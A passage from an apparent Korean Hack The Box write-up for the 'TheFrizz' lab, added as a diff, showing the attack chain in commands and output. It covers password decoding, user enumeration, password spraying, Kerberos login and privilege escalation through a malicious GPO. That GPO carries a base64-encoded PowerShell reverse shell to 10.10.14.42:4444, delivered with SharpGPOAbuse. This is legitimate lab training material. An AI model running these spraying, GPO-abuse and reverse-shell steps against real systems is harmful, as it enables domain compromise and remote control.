@@ -435,11 +435,164 @@ log_path = c:\wapt\log
 
 ```
 
-base64 디코딩
+base64 디코딩하여 평문 패스워드 획득
 ```bash
 ┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
 └─$ echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d
 !suBcig@MehTed!R
 
 ```
+
+사용자 목록 추출
+```bash
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k --users-export users.txt
+SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                            
+SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 
+SMB         frizzdc.frizz.htb 445    frizzdc          -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                         
+SMB         frizzdc.frizz.htb 445    frizzdc          Administrator                 2025-02-25 21:24:10 0       Built-in account for administering the computer/domain                                                                
+SMB         frizzdc.frizz.htb 445    frizzdc          Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                              
+SMB         frizzdc.frizz.htb 445    frizzdc          krbtgt                        2024-10-29 14:19:54 0       Key Distribution Center Service Account                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          f.frizzle                     2024-10-29 14:27:03 0       Wizard in Training                                                                                                    
+SMB         frizzdc.frizz.htb 445    frizzdc          w.li                          2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          h.arm                         2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          M.SchoolBus                   2024-10-29 14:27:03 0       Desktop Administrator                                                                                                 
+SMB         frizzdc.frizz.htb 445    frizzdc          d.hudson                      2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          k.franklin                    2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          l.awesome                     2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          t.wright                      2024-10-29 14:27:03 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          r.tennelli                    2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          J.perlstein                   2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          a.perlstein                   2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          p.terese                      2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          v.frizzle                     2024-10-29 14:27:04 0       The Wizard                                                                                                            
+SMB         frizzdc.frizz.htb 445    frizzdc          g.frizzle                     2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          c.sandiego                    2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          c.ramon                       2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          m.ramon                       2024-10-29 14:27:04 0       Student                                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          w.Webservice                  2024-10-29 14:27:04 0       Service for the website                                                                                               
+SMB         frizzdc.frizz.htb 445    frizzdc          [*] Enumerated 21 local users: frizz
+SMB         frizzdc.frizz.htb 445    frizzdc          [*] Writing 21 local users to users.txt
+
+```
+
+password spraying 수행하여 계정 획득 `M.SchoolBus/!suBcig@MehTed!R`
+```bash
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ nxc smb frizzdc.frizz.htb -u users.txt -p '!suBcig@MehTed!R' -k -t 100
+SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                            
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Administrator:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Guest:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED 
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\krbtgt:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED 
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\w.li:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
+SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\h.arm:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
+SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R 
+
+```
+
+
+krb5conf 사용하여 로그인 
+```bash
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ nxc smb frizzdc.frizz.htb -u 'M.SchoolBus' -p '!suBcig@MehTed!R' --generate-krb5-file krb5conf2 -k
+SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                            
+SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R 
+                                                                                                                   
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ export KRB5_CONFIG=krb5conf2
+                                                                                                                   
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ kinit M.SchoolBus@FRIZZ.HTB
+Password for M.SchoolBus@FRIZZ.HTB: 
+                                                                                                                   
+┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
+└─$ ssh -K M.SchoolBus@FRIZZ.HTB                  
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+PowerShell 7.4.5
+PS C:\Users\M.SchoolBus> whoami
+frizz\m.schoolbus
+
+```
+
+### Privilege Escalation
+
+BloodHound
+M.SchoolBus 계정이 group policy creator owners 그룹 확인
+![[Pasted image 20260312102132.png]]
+
+EvilGPO 새 그룹 정책 생성 후 Doamin Controllers OU에 연결
+```powershell
+PS C:\Users\M.SchoolBus\Desktop> new-gpo -name "EvilGPO"                                                   
+
+DisplayName      : EvilGPO
+DomainName       : frizz.htb
+Owner            : frizz\M.SchoolBus
+Id               : 736277d3-8047-4961-87ea-4522fc30e872
+GpoStatus        : AllSettingsEnabled
+Description      : 
+CreationTime     : 3/12/2026 1:29:17 AM
+ModificationTime : 3/12/2026 1:29:17 AM
+UserVersion      : 
+ComputerVersion  : 
+WmiFilter        : 
+
+PS C:\Users\M.SchoolBus\Desktop> New-GPLink -Name "EvilGPO" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
+
+GpoId       : 736277d3-8047-4961-87ea-4522fc30e872
+DisplayName : EvilGPO
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=frizz,DC=htb
+Order       : 2
+
+```
+
+![[Pasted image 20260312103002.png]]
+
+one line payload base64 변환 
+```bash
+┌──(kali㉿kali)-[~/OSCP/git/SharpGPOAbuse]
+└─$ echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.42",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
+
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==  
+```
+
+SharpGPOAbuse를 사용하여 EvilGPO에 리버스 쉘을 연결하는 작업 스케줄러를 추가
+
+```bash
+PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author frizz.htb\Administrator --Command "cmd.exe" --Arguments "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== " --GPOName "EvilGPO"                                                                            
+[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] GUID of "EvilGPO" is: {66BD0289-5EE4-4AF6-85EF-A297883934A0}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{66BD0289-5EE4-4AF6-85EF-A297883934A0}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+
+```
+
+gpupdate로 GPO를 강제 적용
+```Powershell
+PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+
+```
+
+
+리버스쉘 연결
+```bash
+rlwrap nc -lnvp 4444
+```
+![[Pasted image 20260312105530.png]]
+
+root.txt 획득
+![[Pasted image 20260312105629.png]]
 
